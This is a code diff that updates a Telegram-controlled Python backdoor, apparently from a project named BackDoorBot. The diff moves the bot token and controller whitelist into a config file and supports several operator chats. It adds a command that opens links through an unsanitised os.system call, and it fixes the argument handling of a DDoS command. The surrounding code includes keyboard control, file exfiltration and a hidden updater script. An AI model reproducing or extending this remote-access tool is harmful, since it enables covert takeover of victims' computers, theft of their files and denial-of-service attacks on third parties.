@@ -9,26 +9,31 @@ import wget
 import pyautogui
 import keyboard
 import telebot
-import argparse
+import json as jsn
+
+with open("config.json", 'r', encoding='utf-8') as f:
+    data = jsn.load(f)
+
+class Data:
+    
+    id      = data["white_list"]
+    inform  = data["info"]
+    update  = data["update"]
+    name    = data["name_pc"]
+    token   = data["bot_token"]
+
 
 if not os.path.isdir('media'):
     os.mkdir('media')
 
-id = -607433374
-inform='https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/documentation.txt'
+id = Data.id
 
-parser = argparse.ArgumentParser(description='Process some integers.')
-parser.add_argument('-n', metavar='name', type=str, dest="name",help='name')
-parser.add_argument('-t', metavar='token', type=str, dest="token",help='token')
-parser.add_argument('-u', metavar='update', type=int, dest="update",help='update')
-argp = parser.parse_args()
-
-if argp.update == 1:
+if Data.update == 1:
     os.remove('upd.vbs')
     os.remove('upd.bat')
     exit()
 
-TOKEN_PC=[argp.name,argp.token]
+TOKEN_PC=[Data.name, Data.token]
 
 bot=telebot.TeleBot(TOKEN_PC[1])
 
@@ -38,8 +43,13 @@ class Func_API:
         
         self.NAME_PC = TOKEN_PC[0]
         self.tg_api = bot
-        self.id = id
-        bot.send_message(self.id, f'{self.NAME_PC} run...')
+        for ids in id:
+            try:
+                bot.send_message(ids, f'{self.NAME_PC} run...')
+            except telebot.apihelper.ApiTelegramException:
+                pyautogui.alert("Вы указали неверный токен")
+                bot.stop_polling()
+                
 
     def rasbiv(self,text):
         texn=text.split()
@@ -318,10 +328,17 @@ sh.Run "{pth}\\upd.bat", 0'''
                 pr = '/'.join(path[:-1])
                 otv = f"🖥❌ File not found \n|{pr}\n|--  "+'\n|--  '.join(os.listdir(pr))
             bot.send_message(self.id,otv)
-        
+    def browser(self, link):
+        try:
+            linke = 'start ' + link
+            os.system(linke)
+            bot.send_message(self.id, '🖥✅')
+        except:
+            bot.send_message(self.id, '🖥❌')
 
-    def perfor(self,text):
-        
+
+    def perfor(self,text, id_chat):
+        self.id = id_chat
         text = self.rasbiv(text)
         name_pc=text["name"]
         comnd = text["cmnd"]
@@ -365,7 +382,7 @@ sh.Run "{pth}\\upd.bat", 0'''
             if comnd=="keyb" or comnd=="keyboard":
                 threading.Thread(target=self.keyb, args=(text_comand[0], )).start()
 
-            if comnd=="rask":
+            if comnd=="rask" or comnd=="layout":
                 threading.Thread(target=self.rask).start()
                 
             if comnd=="dir" or comnd=="direction":
@@ -386,7 +403,7 @@ sh.Run "{pth}\\upd.bat", 0'''
             if comnd=="ddosf" or comnd=="attack_for":
                 try:
                     for cores in text_comand[1]:
-                        threading.Thread(target=self.ddos_f, args=(text_comand[0], int(text_comand[2]), )).start()
+                        threading.Thread(target=self.ddos_f, args=(text_comand[0], int(text_comand[1]), )).start()
                     bot.send_message(self.id, '🖥✅')
                 except:
                     bot.send_message(self.id, '🖥❌')
@@ -398,6 +415,10 @@ sh.Run "{pth}\\upd.bat", 0'''
                     bot.send_message(self.id, '🖥✅')
                 except:
                     bot.send_message(self.id, '🖥❌')
+
+            if comnd=="browser" or comnd=="brws":
+                threading.Thread(target=self.browser, args=(text_comand[0], )).start()
+
             
             if comnd=="pull" or comnd=="pull_file":
                 threading.Thread(target=self.pull_file, args=(text_comand[0], )).start()
@@ -415,17 +436,17 @@ func_api = Func_API()
 
 @bot.message_handler(commands=['info','start'])
 def start_message(message):
-    if message.chat.id == id:
-	    bot.send_message(id, f"Список функций: \n{inform}")
+    if message.chat.id in id:
+	    bot.send_message(message.chat.id, f"Список функций: \n{Data.inform}")
 
 @bot.message_handler(content_types=['text'])
 def infokigb(message):
-    if message.chat.id == id:
-        func_api.perfor(message.text)    
+    if message.chat.id in id:
+        func_api.perfor(message.text, message.chat.id)    
 
 @bot.message_handler(content_types=['photo'])
 def handle_docs_document(message):
-    if message.chat.id == id:
+    if message.chat.id in id:
         file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         src = 'media/' + message.photo[1].file_id 
@@ -436,20 +457,20 @@ def handle_docs_document(message):
 
 @bot.message_handler(content_types=['video'])
 def get_file(message):
-    if message.chat.id == id:
-        file_name = 'media/' + message.json['video']['file_name']
+    if message.chat.id in id:
+        print(message.json)
+        file_name = 'media/' + message.json['video']['file_id']
         file_info = bot.get_file(message.video.file_id)
         with open(file_name, "wb") as f:
             file_content = bot.download_file(file_info.file_path)
             f.write(file_content)
         video=func_api.ren(file_name[5:],"vid")
-        bot.reply_to(message, f"OK. Сохранил как {video}")
+        bot.reply_to(message, f"OK. Сохранил как video")
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
-    if message.chat.id == id:
+    if message.chat.id in id:
         try:
-            chat_id = message.chat.id
             file_info = bot.get_file(message.document.file_id)
             downloaded_file = bot.download_file(file_info.file_path)
             src = 'media/' + message.document.file_name
